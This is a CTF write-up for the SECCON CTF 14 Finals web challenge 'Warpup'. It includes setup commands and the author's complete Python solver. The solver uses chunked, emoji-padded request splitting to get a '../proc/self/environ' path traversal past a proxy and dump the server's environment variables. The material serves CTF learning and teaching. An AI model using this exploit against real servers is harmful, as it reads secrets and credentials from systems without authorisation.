---
title: "Warpup - SECCON CTF 14 Finals 2026"
category: "web"
type: "writeup"
tags: ["arkark-my-ctf-challenges", "author-solution", "challenge-source", "warpup", "web", "seccon-ctf-14-finals"]
summary: "Launch a challenge server:"
source:
  name: "arkark/my-ctf-challenges"
  url: "https://github.com/arkark/my-ctf-challenges/tree/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202603_SECCON_CTF_14_Finals/web/warpup"
license: "none stated"
ctf:
  name: "SECCON CTF 14 Finals"
  year: 2026
  challenge: "Warpup"
---

## Challenge

- **Author:** [arkark](https://github.com/arkark)
- **Source:** <https://github.com/arkark/my-ctf-challenges/tree/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202603_SECCON_CTF_14_Finals/web/warpup>
- **CTF:** SECCON CTF 14 Finals 2026

---

# [web] Warpup

## Description

warpup = warp + warmup

- Challenge: `http://warpup.{int,dom}.seccon.games:3000`

## Attachments

- [warpup](distfiles)

## Usage

Launch a challenge server:

```
cd challenge
docker compose up
```

Run the author's solver:

```
docker run -it \
    -e SECCON_HOST=localhost \
    -e SECCON_PORT=3000 \
    --network=host \
    (docker build -q ./solution)
```


## Solver: `solve.py`

<https://github.com/arkark/my-ctf-challenges/blob/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202603_SECCON_CTF_14_Finals/web/warpup/solution/solve.py>

```python
import ptrlib
import time, os

io = ptrlib.Socket(
    os.getenv("SECCON_HOST", "localhost"),
    int(os.getenv("SECCON_PORT", 3000)),
)
io.debug = True

path = b"../proc/self/environ"

parts = path.split(b"..")
assert len(parts) >= 2

chunks = [parts[0] + b"."]
for part in parts[1:]:
    chunks.append("🦀".encode() * 6000)  # Split chunks in `backend`
    chunks.append(b"." + part)

length = sum([len(chunk) for chunk in chunks])

io.send(
    f"""
POST /file HTTP/1.1\r
Content-Length: {length}\r
Content-Type: text/plain\r
Host: localhost:3000\r
\r
""".lstrip().encode()
)

for chunk in chunks:
    io.send(chunk)
    time.sleep(1)  # Split chunks in `proxy`

environ = io.recvall(timeout=0.5).decode().strip()
for e in environ.split("\x00"):
    print(e)
```
